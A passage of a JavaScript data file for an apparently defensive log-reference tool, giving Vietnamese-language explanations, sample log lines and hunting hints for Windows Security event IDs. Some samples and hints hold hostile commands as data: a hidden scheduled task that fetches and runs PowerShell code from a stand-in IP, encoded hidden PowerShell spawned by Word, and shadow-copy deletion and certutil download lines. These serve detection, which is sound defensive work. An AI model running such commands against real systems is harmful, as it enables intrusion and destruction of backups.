  {title:"Logging Application Security Events (BIG-IP ASM 14.1.0)", url:"https://techdocs.f5.com/en-us/bigip-14-1-0/big-ip-asm-implementations-14-1-0/logging-application-security-events.html"},
  {title:"K6868: BIG-IP ASM syslog event levels", url:"https://my.f5.com/manage/s/article/K6868"}
],
"f5-ltm": [
  {title:"BIG-IP LTM Log Messages Reference", url:"https://techdocs.f5.com/kb/en-us/products/big-ip_ltm/releasenotes/related/log-messages.html"},
  {title:"SYN Cookie Troubleshooting: Logs (F5 DevCentral)", url:"https://community.f5.com/kb/technicalarticles/9-syn-cookie-troubleshooting-logs/279431"},
  {title:"K24513413: Warning, connections equals limit ... Connection limit reached", url:"https://my.f5.com/manage/s/article/K24513413"}
],
"f5-apm": [
  {title:"Logging and Reporting (APM, Configuration Guide 11.4.0)", url:"https://techdocs.f5.com/kb/en-us/products/big-ip_apm/manuals/product/apm-config-11-4-0/apm_config_loggingandreporting.html"},
  {title:"Predefined session variable attributes (BIG-IP 15.0.0 APM Visual Policy Editor)", url:"https://techdocs.f5.com/en-us/bigip-15-0-0/big-ip-access-policy-manager-visual-policy-editor/variable-assign-reference/predefined-session-variable-attributes.html"},
  {title:"About IP Geolocation Match (BIG-IP 15.0.0 APM Visual Policy Editor)", url:"https://techdocs.f5.com/en-us/bigip-15-0-0/big-ip-access-policy-manager-visual-policy-editor/access-policy-item-reference/about-endpoint-security-server-side-access-policy-items/about-ip-geolocation-match.html"}
],
"f5-audit": [
  {title:"K09050750: How to find recent configuration changes on the BIG-IP system", url:"https://my.f5.com/manage/s/article/K09050750"},
  {title:"K16304: Audit logging for BIG-IP configuration changes is now enabled by default", url:"https://my.f5.com/manage/s/article/K16304"},
  {title:"BIG-IP TMOS: About Logging (External Monitoring of BIG-IP Systems: Implementations)", url:"https://techdocs.f5.com/en-us/bigip-14-0-0/external-monitoring-of-big-ip-systems-implementations-14-0-0/about-logging.html"}
],

"win-sec": [
  {title:"Security auditing overview — Microsoft Learn", url:"https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/security-auditing-overview"},
  {title:"Advanced security audit policy settings — Microsoft Learn", url:"https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/advanced-security-audit-policy-settings"}
],
"win-sys": [
  {title:"Troubleshoot unexpected reboots using system event logs — Microsoft Learn", url:"https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs"},
  {title:"Event ID 1102 — clearing the Security log — Microsoft Learn", url:"https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-1102"}
],
"win-def": [
  {title:"Troubleshoot Microsoft Defender Antivirus — Microsoft Learn", url:"https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-microsoft-defender-antivirus"},
  {title:"Attack Surface Reduction events — Microsoft Learn", url:"https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-windows-events"}
],
"win-ps": [
  {title:"about_Logging_Windows — Microsoft Learn", url:"https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows"}
],
"win-sysmon": [
  {title:"Sysmon — Sysinternals (Microsoft Learn)", url:"https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon"},
  {title:"Named Pipe, Data Component DC0048 — MITRE ATT&CK", url:"https://attack.mitre.org/datacomponents/DC0048/"}
],
"win-rdp": [
  {title:"RDP connection artifacts — Windows Forensics", url:"https://www.windowsforensics.app/en/artifacts/rdp-connections"},
  {title:"RDP Event Log DFIR", url:"https://dfironthemountain.wordpress.com/2019/02/15/rdp-event-log-dfir/"}
],
"win-task": [
  {title:"Windows Task Scheduler event IDs — NXLog", url:"https://nxlog.co/news-and-blog/posts/windows-task-scheduler-event-ids"}
],
"win-oth": [
  {title:"Event ID 2889 — LDAP signing — Microsoft Learn", url:"https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd941849(v=ws.10)"},
  {title:"Detecting Lateral Movement via WinRM (Event 6/91)", url:"https://in.security/2021/05/03/detecting-lateral-movement-via-winrm-using-kql/"}
],
"lin-auth": [
  {title:"sshd(8) man page", url:"https://man.openbsd.org/sshd.8"},
  {title:"sudo(8) man page", url:"https://www.sudo.ws/docs/man/sudo.man/"}
],
"lin-sys": [
  {title:"RHEL/CentOS default rsyslog.conf reference", url:"https://www.thegeekdiary.com/how-to-change-the-default-log-directory-var-log-in-rsyslog-for-centos-rhel-67/amp/"},
  {title:"Where is /var/log/yum.log in RHEL8/RHEL9? — Red Hat", url:"https://access.redhat.com/solutions/7090974"}
],
"lin-acct": [
  {title:"last(1)/lastb(1) man page", url:"https://man7.org/linux/man-pages/man1/last.1.html"},
  {title:"lastlog(8) man page", url:"https://man7.org/linux/man-pages/man8/lastlog.8.html"},
  {title:"utmp(5)/wtmp(5) man page", url:"https://man7.org/linux/man-pages/man5/utmp.5.html"},
  {title:"who(1) man page", url:"https://man7.org/linux/man-pages/man1/who.1.html"}
],
"lin-audit": [
  {title:"Linux Audit Documentation", url:"https://github.com/linux-audit/audit-documentation"},
  {title:"ausearch(8) man page", url:"https://man7.org/linux/man-pages/man8/ausearch.8.html"}
],
"web-acc": [
  {title:"Apache HTTP Server — mod_log_config (Combined Log Format)", url:"https://httpd.apache.org/docs/current/mod/mod_log_config.html"},
  {title:"Nginx ngx_http_log_module", url:"https://nginx.org/en/docs/http/ngx_http_log_module.html"}
],
"web-iis": [
  {title:"W3C Extended Log File Format (IIS) — Microsoft Learn", url:"https://learn.microsoft.com/en-us/windows/win32/http/w3c-logging"},
  {title:"HTTP Status and Substatus Codes (IIS) — Microsoft Learn", url:"https://learn.microsoft.com/en-us/troubleshoot/developer/webapps/iis/health-diagnostic-performance/http-status-code"}
],
"web-atk": [
  {title:"MITRE ATT&CK T1190 — Exploit Public-Facing Application", url:"https://attack.mitre.org/techniques/T1190/"},
  {title:"ProxyShell exploitation pattern (autodiscover.json)", url:"https://analyticsrules.exchange/analyticrules/968358d6-6af8-49bb-aaa4-187b3067fb95/"}
],
"k8s-audit": [
  {title:"Kubernetes Auditing — kubernetes.io", url:"https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/"},
  {title:"Kubernetes RBAC — privilege escalation prevention", url:"https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping"}
],
"k8s-comp": [
  {title:"Kubernetes Logging Architecture — kubernetes.io", url:"https://kubernetes.io/docs/concepts/cluster-administration/logging/"},
  {title:"klog library (log line format)", url:"https://github.com/kubernetes/klog"}
],
"k8s-ev": [
  {title:"Kubernetes API: Event v1 — kubernetes.io", url:"https://kubernetes.io/docs/reference/kubernetes-api/cluster-resources/event-v1/"}
],
"vc-ev": [
  {title:"vim.event reference (govsphere)", url:"https://github.com/hooklift/govsphere/blob/master/reference/vim.event.BadUsernameSessionEvent.html"},
  {title:"Defending vSphere from UNC3944 — Mandiant/Google Cloud", url:"https://cloud.google.com/blog/topics/threat-intelligence/defending-vsphere-from-unc3944"}
],
"vc-sso": [
  {title:"Single Sign-On Audit Events — Broadcom TechDocs", url:"https://techdocs.broadcom.com/us/en/vmware-cis/vsphere/vsphere/7-0/vsphere-security/understanding-vsphere-hardening-and-compliance/audit-logging/single-sign-on-audit-events.html"}
],
"vc-file": [
  {title:"VMware Photon OS — Analyzing System Logs with journalctl", url:"https://vmware.github.io/photon/assets/files/html/3.0/photon_troubleshoot/analyzing-system-logs-with-journalctl.html"}
],
"esx-file": [
  {title:"Location and Contents of ESXi log files — Broadcom KB 306962", url:"https://knowledge.broadcom.com/external/article/306962/location-of-esxi-log-files.html"},
  {title:"Activate/Deactivate execInstalledOnly Enforcement — Broadcom TechDocs", url:"https://techdocs.broadcom.com/us/en/vmware-cis/vsphere/vsphere/8-0/vsphere-security/securing-esxi-hosts/securing-the-esxi-configuration/managing-a-secure-esxi-configuration/enable-or-disable-the-execinstalledonly-enforcement-for-a-secure-esxi-configuration.html"}
],
"esx-ev": [
  {title:"Identifying the User/Process that Modified ESXi Lockdown Mode — Broadcom KB", url:"https://knowledge.broadcom.com/external/article/434674/identifying-the-user-or-process-that-mod.html"}
]
};

/* ATT&CK technique IDs -> attack.mitre.org links. Handles sub-techniques (T1110.003 -> /T1110/003/) and comma-separated lists. */
function attackLinks(attStr){
  if (!attStr) return [];
  return attStr.split(",").map(s=>s.trim()).filter(Boolean).map(id=>{
    const m = id.match(/^(T\d{4})(?:\.(\d{3}))?$/);
    if (!m) return {id, url:null};
    const url = m[2] ? `https://attack.mitre.org/techniques/${m[1]}/${m[2]}/` : `https://attack.mitre.org/techniques/${m[1]}/`;
    return {id, url};
  });
}

/* [src, id, name, sev, attack, desc, fields, sample, hunt, query] */
const E = [


/* ===== Windows Security ===== */
["win-sec","4624","Đăng nhập thành công","m","T1078",
 "Tài khoản đăng nhập thành công. Trường quan trọng nhất là LogonType để biết cách đăng nhập.",
 R`LogonType=2: Interactive (tại bàn phím/console)
LogonType=3: Network (SMB, share, WMI, PsExec)
LogonType=4: Batch (scheduled task)
LogonType=5: Service
LogonType=7: Unlock màn hình
LogonType=8: NetworkCleartext (mật khẩu truyền dạng rõ, vd. IIS Basic)
LogonType=9: NewCredentials (runas /netonly, dấu hiệu pass-the-hash với seclogo)
LogonType=10: RemoteInteractive (RDP)
LogonType=11: CachedInteractive (credential cache, máy ngoài domain)
ElevatedToken: %%1842 = Yes, phiên có quyền admin
AuthenticationPackageName: NTLM / Kerberos / Negotiate
IpAddress, WorkstationName: nguồn đăng nhập`,
 R`EventID=4624 SubjectUserSid=S-1-5-18 TargetUserName=thanhnv TargetDomainName=CORP LogonType=10 LogonProcessName=User32 AuthenticationPackageName=Negotiate WorkstationName=WS-IT-021 IpAddress=10.20.5.23 IpPort=0 ElevatedToken=%%1842`,
 "LogonType 10 từ IP ngoài dải quản trị; LogonType 3 + NTLM từ một nguồn tới nhiều host trong vài phút (lateral movement); LogonType 9 với LogonProcessName=seclogo (pass-the-hash kiểu Mimikatz sekurlsa::pth); tài khoản service đăng nhập interactive.",
 R`Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 500 |
  Where-Object { $_.Properties[8].Value -eq 10 } |
  Select TimeCreated, @{n='User';e={$_.Properties[5].Value}}, @{n='IP';e={$_.Properties[18].Value}}`],


["win-sec","4625","Đăng nhập thất bại","h","T1110",
 "Một lần đăng nhập thất bại. Status/SubStatus cho biết lý do chính xác.",
 R`0xC000006A: Sai mật khẩu (user tồn tại)
0xC0000064: User không tồn tại
0xC0000234: Tài khoản đang bị khóa
0xC0000072: Tài khoản bị disable
0xC000006F: Đăng nhập ngoài giờ cho phép
0xC0000070: Máy trạm không được phép
0xC0000071: Mật khẩu hết hạn
0xC0000193: Tài khoản hết hạn
0xC0000224: Bắt buộc đổi mật khẩu lần sau
0xC000015B: Không được cấp quyền cho logon type này`,
 R`EventID=4625 TargetUserName=administrator TargetDomainName=CORP Status=0xc000006d SubStatus=0xc000006a LogonType=3 LogonProcessName=NtLmSsp AuthenticationPackageName=NTLM WorkstationName=KALI IpAddress=10.30.1.99 IpPort=51522`,
 "Password spray: một IP thử nhiều user, mỗi user ít lần. Brute force: một user bị thử nhiều lần. Nhiều 0xC0000064 liên tiếp là dò tên user. WorkstationName lạ (KALI, WIN-xxxxx ngẫu nhiên) là dấu hiệu công cụ tấn công.",
 ""],


["win-sec","4634","Đăng xuất","i","",
 "Phiên logon kết thúc. Ghép với 4624 qua TargetLogonId để tính thời lượng phiên.",
 "TargetLogonId: khớp với TargetLogonId của 4624", R`EventID=4634 TargetUserName=thanhnv TargetDomainName=CORP TargetLogonId=0x3E7A1C LogonType=3`, "", ""],


["win-sec","4647","User chủ động đăng xuất","i","",
 "User bấm Sign out (phiên interactive/RDP). 4634 có thể đến sau.","TargetUserName: Tên tài khoản đăng xuất\nTargetDomainName: Domain/máy chứa tài khoản\nTargetLogonId: ID phiên đăng nhập (khớp với LogonId của 4624 tương ứng)", R`EventID=4647 TargetUserName=thanhnv TargetDomainName=CORP TargetLogonId=0x3E7A1C`, "", ""],


["win-sec","4648","Đăng nhập bằng credential tường minh","h","T1078, T1021",
 "Một tiến trình dùng credential khác với phiên hiện tại (runas, PsExec -u, net use /user, mapped drive).",
 R`SubjectUserName: user đang chạy tiến trình
TargetUserName: credential được dùng
TargetServerName: máy đích
ProcessName: tiến trình khởi tạo`,
 R`EventID=4648 SubjectUserName=thanhnv TargetUserName=adm_thanh TargetDomainName=CORP TargetServerName=SRV-DB01 ProcessName=C:\Windows\System32\runas.exe IpAddress=-`,
 "Một user dùng nhiều credential khác nhau tới nhiều server; ProcessName là công cụ lạ hoặc nằm trong thư mục Temp/ProgramData.", ""],


["win-sec","4672","Gán đặc quyền đặc biệt khi đăng nhập","m","T1078",
 "Đi kèm 4624 khi tài khoản có quyền admin (SeDebugPrivilege, SeBackupPrivilege, SeTcbPrivilege...).",
 "PrivilegeList: danh sách đặc quyền được gán",
 R`EventID=4672 SubjectUserName=adm_thanh SubjectDomainName=CORP SubjectLogonId=0x5A21F0 PrivilegeList=SeSecurityPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeDebugPrivilege`,
 "Tài khoản không nằm trong danh sách admin đã biết mà vẫn có 4672: kiểm tra việc cấp quyền trái phép.", ""],


["win-sec","4688","Tạo tiến trình","h","T1059",
 "Ghi mỗi tiến trình mới. Muốn có CommandLine phải bật GPO: Administrative Templates > System > Audit Process Creation > Include command line in process creation events.",
 R`NewProcessName, ParentProcessName: tiến trình con và cha
CommandLine: tham số dòng lệnh
TokenElevationType=%%1936: Type 1, token đầy đủ (UAC tắt hoặc built-in admin)
TokenElevationType=%%1937: Type 2, đã elevate (Run as administrator)
TokenElevationType=%%1938: Type 3, token giới hạn`,
 R`EventID=4688 SubjectUserName=thanhnv NewProcessName=C:\Windows\System32\cmd.exe ParentProcessName=C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE CommandLine=cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi... TokenElevationType=%%1938`,
 "Office/trình duyệt sinh cmd, powershell, wscript, mshta; rundll32/regsvr32 nạp URL; certutil -urlcache; vssadmin delete shadows; wmic shadowcopy delete; bcdedit /set recoveryenabled no; whoami /priv, net group \"domain admins\" ngay sau đăng nhập.", ""],


["win-sec","4689","Tiến trình kết thúc","i","",
 "Dùng để tính thời gian sống của tiến trình. Thường lọc bỏ vì ồn.","SubjectUserName: Tài khoản sở hữu tiến trình\nSubjectLogonId: ID phiên đăng nhập của subject\nProcessId: PID của tiến trình kết thúc\nProcessName: Đường dẫn file thực thi\nStatus: Mã NTSTATUS khi thoát (0x0 = bình thường)", R`EventID=4689 SubjectUserName=thanhnv ProcessName=C:\Windows\System32\cmd.exe Status=0x0`, "", ""],


["win-sec","4697","Cài đặt service (Security)","h","T1543.003",
 "Service mới được cài. Cần bật Audit Security System Extension. Bản tương ứng luôn có trong System là 7045.",
 R`ServiceFileName: đường dẫn/lệnh thực thi
ServiceStartType: 2=Auto, 3=Manual, 4=Disabled
ServiceAccount: thường là LocalSystem`,
 R`EventID=4697 SubjectUserName=adm_thanh ServiceName=PSEXESVC ServiceFileName=%SystemRoot%\PSEXESVC.exe ServiceType=0x10 ServiceStartType=3 ServiceAccount=LocalSystem`,
 "Xem mục 7045 để biết các mẫu ImagePath đáng ngờ.", ""],


["win-sec","4698","Tạo scheduled task","h","T1053.005",
 "Task mới được đăng ký. TaskContent là XML đầy đủ, chứa lệnh thực thi.",
 R`TaskName: tên và đường dẫn task
TaskContent: XML, xem các thẻ <Command> và <Arguments>`,
 R`EventID=4698 SubjectUserName=thanhnv TaskName=\Microsoft\Windows\UpdateCheck TaskContent=<Exec><Command>powershell.exe</Command><Arguments>-w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.7/a')</Arguments></Exec>`,
 "Task giả danh đường dẫn \\Microsoft\\Windows\\ nhưng do user thường tạo; Command trỏ tới powershell, cmd, mshta, rundll32 hoặc file trong AppData/Temp/Public.", ""],


["win-sec","4699","Xóa scheduled task","m","T1070",
 "Task bị xóa; chú ý task được tạo rồi xóa trong thời gian ngắn (thực thi từ xa kiểu atexec).","SubjectUserName: Tài khoản thực hiện xóa task\nSubjectDomainName: Domain của tài khoản\nSubjectLogonId: ID phiên đăng nhập\nTaskName: Đường dẫn đầy đủ của scheduled task bị xóa", R`EventID=4699 SubjectUserName=adm_thanh TaskName=\xKmPqZ`, "Cặp 4698 → 4699 cách nhau vài giây với tên task ngẫu nhiên: dấu hiệu Impacket atexec.", ""],


["win-sec","4700/4701/4702","Bật / tắt / sửa scheduled task","m","T1053.005",
 "4700 task được enable, 4701 task bị disable, 4702 task bị cập nhật.","SubjectUserName: Tài khoản thực hiện thay đổi\nSubjectDomainName: Domain của tài khoản\nSubjectLogonId: ID phiên đăng nhập\nTaskName: Đường dẫn scheduled task bị enable/disable/sửa\nTaskContentNew: Nội dung XML mới của task (chỉ có ở 4702), chứa lệnh/action thực thi", R`EventID=4702 SubjectUserName=thanhnv TaskName=\Microsoft\Windows\Defrag\ScheduledDefrag TaskContentNew=<Exec><Command>C:\Users\Public\svc.exe</Command></Exec>`, "Task hệ thống có sẵn bị sửa Command: persistence khó phát hiện.", ""],


["win-sec","4719","Thay đổi audit policy hệ thống","c","T1562.002",
 "Chính sách audit bị thay đổi, thường để tắt ghi log trước khi hành động.",
 "AuditPolicyChanges: Success removed / Failure removed là đáng lo nhất",
 R`EventID=4719 SubjectUserName=adm_x SubjectDomainName=CORP Category=Logon/Logoff Subcategory=Logon AuditPolicyChanges=Success removed, Failure removed`,
 "Mọi 4719 ngoài đợt thay đổi GPO có kế hoạch đều cần xác minh.", ""],


["win-sec","4720","Tạo tài khoản user","h","T1136",
 "Tài khoản mới được tạo (local hoặc domain, ghi trên máy/DC thực hiện).",
 "UserAccountControl: cờ khởi tạo của tài khoản",
 R`EventID=4720 SubjectUserName=adm_thanh TargetUserName=svc_backup2 TargetDomainName=CORP SamAccountName=svc_backup2 UserAccountControl=%%2080 %%2082 %%2084`,
 "Tài khoản tạo ngoài quy trình, tên giống tài khoản hệ thống, hoặc được thêm ngay vào nhóm admin (xem 4728/4732).", ""],


["win-sec","4722","Kích hoạt tài khoản","m","T1098",
 "Tài khoản đang disable được enable lại.","SubjectUserName: Tài khoản thực hiện enable\nSubjectLogonId: ID phiên đăng nhập của subject\nTargetUserName: Tài khoản bị kích hoạt lại\nTargetDomainName: Domain của tài khoản đó\nTargetSid: SID của tài khoản bị kích hoạt", R`EventID=4722 SubjectUserName=adm_x TargetUserName=guest TargetDomainName=WS-IT-021`, "Kích hoạt lại Guest hoặc tài khoản nhân viên đã nghỉ.", ""],


["win-sec","4723","User đổi mật khẩu của mình","i","",
 "Người dùng tự đổi mật khẩu.","SubjectUserName: Tài khoản tự đổi mật khẩu (= TargetUserName)\nTargetUserName: Tài khoản bị đổi mật khẩu\nTargetDomainName: Domain của tài khoản\nTargetSid: SID của tài khoản", R`EventID=4723 SubjectUserName=thanhnv TargetUserName=thanhnv TargetDomainName=CORP`, "", ""],


["win-sec","4724","Reset mật khẩu tài khoản khác","h","T1098",
 "Một tài khoản đặt lại mật khẩu cho tài khoản khác.","SubjectUserName: Tài khoản thực hiện reset (khác Target)\nSubjectLogonId: ID phiên đăng nhập của subject\nTargetUserName: Tài khoản bị reset mật khẩu\nTargetDomainName: Domain của tài khoản bị reset\nTargetSid: SID của tài khoản bị reset", R`EventID=4724 SubjectUserName=helpdesk01 TargetUserName=adm_ceo TargetDomainName=CORP`, "Reset mật khẩu tài khoản đặc quyền hoặc tài khoản service; helpdesk reset hàng loạt.", ""],


["win-sec","4725","Vô hiệu hóa tài khoản","m","T1531",
 "Tài khoản bị disable.","SubjectUserName: Tài khoản thực hiện disable\nTargetUserName: Tài khoản bị vô hiệu hóa\nTargetDomainName: Domain của tài khoản\nTargetSid: SID của tài khoản bị disable", R`EventID=4725 SubjectUserName=adm_x TargetUserName=adm_thanh TargetDomainName=CORP`, "Hàng loạt tài khoản admin bị disable: kẻ tấn công khóa quyền ứng cứu trước khi mã hóa.", ""],


["win-sec","4726","Xóa tài khoản","m","T1531, T1070",
 "Tài khoản bị xóa.","SubjectUserName: Tài khoản thực hiện xóa\nTargetUserName: Tài khoản bị xóa\nTargetDomainName: Domain của tài khoản bị xóa\nTargetSid: SID của tài khoản đã xóa (hữu ích để tra cứu sau khi tài khoản không còn)", R`EventID=4726 SubjectUserName=adm_x TargetUserName=svc_backup2 TargetDomainName=CORP`, "Tài khoản được tạo rồi xóa trong vài giờ.", ""],


["win-sec","4738","Thay đổi thuộc tính tài khoản","m","T1098",
 "Thuộc tính user thay đổi (UAC flags, SPN gián tiếp, đường dẫn profile...).",
 R`UserAccountControl: chú ý 'Don't Require Preauth' (AS-REP roasting) và 'Password Not Required'
OldUacValue / NewUacValue: so sánh trước sau`,
 R`EventID=4738 SubjectUserName=adm_x TargetUserName=svc_sql OldUacValue=0x210 NewUacValue=0x400210 UserAccountControl=%%2096`,
 "Bật cờ DONT_REQ_PREAUTH (0x400000) cho tài khoản: chuẩn bị AS-REP roast.", ""],


["win-sec","4740","Tài khoản bị khóa","m","T1110",
 "Ghi trên DC (PDC Emulator). CallerComputerName là máy gây ra các lần sai.",
 "CallerComputerName: nguồn gây khóa", R`EventID=4740 TargetUserName=thanhnv TargetDomainName=CORP CallerComputerName=WS-IT-021 SubjectUserName=DC01$`,
 "Nhiều tài khoản bị khóa cùng lúc từ một CallerComputerName: spray/brute force.", ""],


["win-sec","4767","Mở khóa tài khoản","i","",
 "Tài khoản được unlock.","SubjectUserName: Tài khoản thực hiện unlock (thường helpdesk/admin)\nTargetUserName: Tài khoản được mở khóa\nTargetDomainName: Domain của tài khoản\nTargetSid: SID của tài khoản", R`EventID=4767 SubjectUserName=helpdesk01 TargetUserName=thanhnv TargetDomainName=CORP`, "", ""],


["win-sec","4728/4729","Thêm/xóa thành viên nhóm Global (domain)","c","T1098",
 "4728 thêm thành viên, 4729 xóa thành viên khỏi nhóm bảo mật global, ví dụ Domain Admins.",
 "TargetUserName: tên nhóm; MemberName: DN thành viên",
 R`EventID=4728 SubjectUserName=adm_x MemberName=CN=svc_backup2,OU=Service,DC=corp,DC=local TargetUserName=Domain Admins TargetDomainName=CORP`,
 "Cảnh báo ngay khi nhóm là Domain Admins, Enterprise Admins, Schema Admins, Administrators, Account Operators, Backup Operators, DnsAdmins.", ""],


["win-sec","4732/4733","Thêm/xóa thành viên nhóm Local","h","T1098",
 "Nhóm local trên máy (vd. Administrators, Remote Desktop Users) hoặc nhóm domain local.","SubjectUserName: Tài khoản thực hiện thêm/xóa thành viên\nMemberSid: SID của tài khoản được thêm vào/xóa khỏi nhóm\nTargetUserName: Tên nhóm local bị thay đổi (vd. Administrators)\nTargetDomainName: Domain/scope chứa nhóm (Builtin, hostname máy...)", R`EventID=4732 SubjectUserName=thanhnv MemberSid=S-1-5-21-...-1104 TargetUserName=Administrators TargetDomainName=Builtin`, "User tự thêm mình vào Administrators trên máy trạm.", ""],


["win-sec","4756/4757","Thêm/xóa thành viên nhóm Universal","c","T1098",
 "Nhóm universal, ví dụ Enterprise Admins.","SubjectUserName: Tài khoản thực hiện thay đổi\nMemberName: Distinguished Name của tài khoản được thêm/xóa\nTargetUserName: Tên nhóm universal bị thay đổi (vd. Enterprise Admins)\nTargetDomainName: Domain chứa nhóm", R`EventID=4756 SubjectUserName=adm_x MemberName=CN=adm_x2,CN=Users,DC=corp,DC=local TargetUserName=Enterprise Admins`, "", ""],


["win-sec","4768","Yêu cầu Kerberos TGT (AS-REQ)","m","T1558.004",
 "Ghi trên DC khi client xin TGT.",
 R`Status=0x0: thành công
Status=0x6: user không tồn tại
Status=0x12: tài khoản disable/khóa/hết hạn
Status=0x17: mật khẩu hết hạn
PreAuthType=0: không pre-auth, dấu hiệu AS-REP roasting
TicketEncryptionType=0x17: RC4, đáng ngờ trong môi trường đã dùng AES (0x11/0x12)`,
 R`EventID=4768 TargetUserName=svc_sql TargetDomainName=CORP ServiceName=krbtgt TicketEncryptionType=0x17 PreAuthType=0 Status=0x0 IpAddress=::ffff:10.20.5.23`,
 "PreAuthType=0 cho tài khoản thường; nhiều Status=0x6 từ một IP (dò user qua Kerberos, kerbrute).", ""],


["win-sec","4769","Yêu cầu Kerberos service ticket (TGS)","h","T1558.003",
 "Ghi trên DC khi xin ticket truy cập dịch vụ theo SPN. Nguồn chính để phát hiện Kerberoasting.",
 R`ServiceName: tài khoản dịch vụ (bỏ qua krbtgt và tài khoản máy kết thúc bằng $)
TicketEncryptionType=0x17: RC4-HMAC, nghi Kerberoasting
TicketEncryptionType=0x12: AES256 (bình thường)
Status=0x0: thành công`,
 R`EventID=4769 TargetUserName=thanhnv@CORP.LOCAL ServiceName=svc_sql TicketEncryptionType=0x17 TicketOptions=0x40810000 IpAddress=::ffff:10.20.5.23 Status=0x0`,
 "Một user xin TGS cho nhiều SPN khác nhau bằng RC4 trong vài phút; tạo honey SPN (tài khoản mồi có SPN) rồi cảnh báo mọi 4769 tới nó.", ""],


["win-sec","4771","Kerberos pre-authentication thất bại","m","T1110",
 "Ghi trên DC; tương đương 4625 cho Kerberos.",
 R`FailureCode=0x18: sai mật khẩu
FailureCode=0x12: tài khoản disable/khóa
FailureCode=0x25: lệch thời gian`,
 R`EventID=4771 TargetUserName=thanhnv ServiceName=krbtgt/CORP FailureCode=0x18 PreAuthType=2 IpAddress=::ffff:10.30.1.99`,
 "Spray qua Kerberos không sinh 4625 trên DC mà sinh 4771 với 0x18.", ""],


["win-sec","4776","Xác thực NTLM","m","T1110, T1550.002",
 "DC (hoặc máy local với tài khoản local) xác thực credential NTLM.",
 R`Status=0x0: thành công
Status=0xC000006A: sai mật khẩu
Status=0xC0000064: user không tồn tại
Workstation: máy client`,
 R`EventID=4776 PackageName=MICROSOFT_AUTHENTICATION_PACKAGE_V1_0 TargetUserName=administrator Workstation=KALI Status=0xc000006a`,
 "NTLM tới tài khoản admin trong môi trường đã ưu tiên Kerberos; Workstation lạ.", ""],


["win-sec","4778/4779","Kết nối lại / ngắt phiên RDP","i","T1021.001",
 "4778 reconnect, 4779 disconnect phiên terminal hoặc fast user switching.", "ClientName, ClientAddress: máy và IP client", R`EventID=4778 AccountName=adm_thanh AccountDomain=CORP SessionName=RDP-Tcp#3 ClientName=WS-IT-021 ClientAddress=10.20.5.23`, "", ""],


["win-sec","4794","Đặt mật khẩu DSRM","c","T1098",
 "Mật khẩu Directory Services Restore Mode trên DC bị đặt lại; có thể dùng làm backdoor.","SubjectUserName: Tài khoản thực hiện đặt mật khẩu DSRM\nSubjectDomainName: Domain của tài khoản\nWorkstation Name: Máy (thường là DC) nơi thực hiện thao tác\nStatus: Kết quả thao tác (0x0 = thành công)", R`EventID=4794 SubjectUserName=adm_x SubjectDomainName=CORP Workstation=DC01 Status=0x0`, "Mọi 4794 ngoài quy trình đều cần điều tra.", ""],


["win-sec","4798","Liệt kê nhóm local của một user","m","T1087.001",
 "Một tiến trình đọc membership nhóm local của user.", "CallerProcessName: tiến trình thực hiện", R`EventID=4798 SubjectUserName=thanhnv TargetUserName=Administrator TargetDomainName=WS-IT-021 CallerProcessName=C:\Windows\System32\net.exe`, "Lọc bỏ explorer.exe, mmc.exe; giữ net.exe, powershell.exe và tiến trình lạ.", ""],


["win-sec","4799","Liệt kê thành viên nhóm local","m","T1069.001",
 "Thành viên nhóm local (bảo mật) bị liệt kê.","SubjectUserName: Tài khoản/tiến trình thực hiện liệt kê\nTargetUserName: Tên nhóm local bị liệt kê thành viên (vd. Administrators)\nTargetDomainName: Domain/scope của nhóm\nCallerProcessName: Tiến trình gọi API liệt kê (vd. net1.exe, PowerShell)", R`EventID=4799 SubjectUserName=thanhnv TargetUserName=Administrators TargetDomainName=Builtin CallerProcessName=C:\Windows\System32\net1.exe`, "Nhiều 4799 trên nhiều host từ cùng tài khoản: trinh sát kiểu BloodHound/SharpHound.", ""],


["win-sec","4662","Thao tác trên object AD","c","T1003.006",
 "Ghi khi có SACL trên object AD. Dùng để phát hiện DCSync.",
 R`Properties chứa {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}: DS-Replication-Get-Changes
Properties chứa {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}: DS-Replication-Get-Changes-All
Properties chứa {89e95b76-444d-4c62-991a-0facbeda640c}: Get-Changes-In-Filtered-Set
AccessMask=0x100: Control Access`,
 R`EventID=4662 SubjectUserName=thanhnv SubjectDomainName=CORP ObjectServer=DS ObjectType=%{19195a5b-6da0-11d0-afd3-00c04fd930c9} AccessMask=0x100 Properties=%%7688 {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}`,
 "Quyền replication được dùng bởi tài khoản không phải tài khoản máy của DC (không kết thúc bằng $): DCSync (Mimikatz lsadump::dcsync, secretsdump).", ""],


["win-sec","4663","Truy cập object (file, registry)","m","T1005",
 "Chỉ ghi khi object có SACL. Thường dùng giám sát thư mục dữ liệu nhạy cảm.",
 R`AccessMask=0x1: ReadData
AccessMask=0x2: WriteData
AccessMask=0x10000: DELETE`,
 R`EventID=4663 SubjectUserName=thanhnv ObjectType=File ObjectName=D:\Share\Finance\BaoCao_Q3.xlsx ProcessName=C:\Windows\explorer.exe AccessMask=0x10000`,
 "Một user xóa/ghi hàng trăm file trong vài phút: ransomware hoặc phá hoại.", ""],


["win-sec","4656","Yêu cầu handle tới object","m","T1003.001",
